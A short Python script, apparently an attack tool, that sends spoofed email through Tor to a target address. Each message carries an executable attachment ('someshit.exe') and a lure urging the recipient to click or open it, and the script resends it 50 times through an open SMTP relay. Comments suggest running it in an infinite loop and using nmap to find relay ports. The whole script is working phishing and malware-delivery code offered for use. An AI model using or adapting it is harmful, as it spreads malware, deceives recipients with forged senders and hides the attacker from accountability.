#!/usr/bin/python
# -*- coding: UTF-8 -*-
 
import smtplib
from email.mime.text import MIMEText
from email.header import Header
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
import socks

socks.setdefaultproxy(socks.SOCKS5, '127.0.0.1', 9150) #before use this port, you have to open TOR
socks.wrapmodule(smtplib) 
 
sender = 'adm@XDD.com.tw' #sender
receivers = ['someone@gmail.com']  #reciver 

msg = MIMEMultipart()
msg["Subject"] = "this is sub" #title of Subject
msg["From"]    = "twitch<twitch@com.tw>" #title of From
msg["To"]      = 'someone@gmail.com' #title of To

part = MIMEText("HI ! you have this shit to click/open ")#your messge right here
msg.attach(part)

part = MIMEApplication(open('someshit.exe','rb').read())
part.add_header('Content-Disposition', 'attachment', filename="someshit.exe")
msg.attach(part)

for i in range(0,50):# you can set Infinite loop right here, but I gana set it to 50
	try:
		smtpObj = smtplib.SMTP('x.x.x.x:25')#some will change their port you can use nmap to check it!
		smtpObj.sendmail(sender, receivers, msg.as_string())
		print ("success")
	except smtplib.SMTPException:
		print ("fail")